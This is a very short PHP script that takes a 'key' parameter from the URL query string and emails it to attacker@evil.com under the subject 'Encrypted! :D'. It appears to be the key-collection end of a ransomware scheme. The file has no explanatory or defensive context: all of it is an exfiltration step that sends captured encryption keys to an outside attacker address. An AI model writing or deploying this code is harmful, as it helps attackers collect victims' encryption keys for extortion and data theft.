<?php
$encryptionkey=($_GET["key"]);
mail("attacker@evil.com", "Encrypted! :D", $encryptionkey);
?>
